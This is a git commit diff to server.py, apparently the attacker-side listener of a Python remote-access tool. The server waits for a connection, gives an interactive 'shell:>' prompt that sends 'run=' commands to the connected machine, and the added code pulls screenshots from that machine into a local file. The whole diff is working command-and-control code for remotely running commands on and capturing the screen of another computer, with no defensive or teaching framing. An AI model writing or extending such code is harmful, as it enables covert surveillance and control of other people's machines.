70761045053a9b439ebabc6972e424d06b285b68
Grandhi Naga Srikanth <nagasrikanthgrandhi@gmail.com>
2018-06-07 05:02:00 -0400

    Update server.py

--- server.py
+++ server.py
@@ -8,6 +8,19 @@ s.bind((ip,port))
 s.listen(1)
 conn,addr=s.accept()
 print("[+]Connected to %s on port:%s"%(addr,port))
+
+
+def download(filename):
+        f=open(filename,"wb")
+        while True:
+            data=conn.recv(1024)          
+            if  b"DONE" in data:
+                break
+            else:
+                f.write(data)
+        f.close()
+        print("done receving")
+
 while True:
     inp=input("shell:>")
     if inp == "exit":
@@ -17,8 +30,9 @@ while True:
     elif inp.startswith("run="):
         conn.send(inp.encode())
         print((conn.recv(1024)).decode())
-    elif inp=="screenshot":
+    elif inp=="sc":
         conn.send(b"screenshot")
+        download("sc.png")
     elif inp=="":
         pass
     else:
